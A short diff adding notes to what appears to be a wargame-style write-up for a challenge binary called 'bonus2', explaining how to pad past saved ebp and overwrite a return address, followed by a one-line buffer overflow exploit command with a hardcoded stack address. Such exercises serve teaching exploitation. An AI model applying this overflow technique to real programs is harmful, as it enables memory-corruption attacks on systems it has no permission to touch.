@@ -53,7 +53,10 @@ Naughty behavior:
 	already here.
 	We can overflow of the lengh of the third
 	string.
-	
+	At end we need 4 bytes to go through ebp
+	and 4 bytes more to write adress.
+
+LANG=fi ; ./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "C" * 18 + "\xef\xf8\xff\xbf" + "C" * 10')	
 	
 	
 
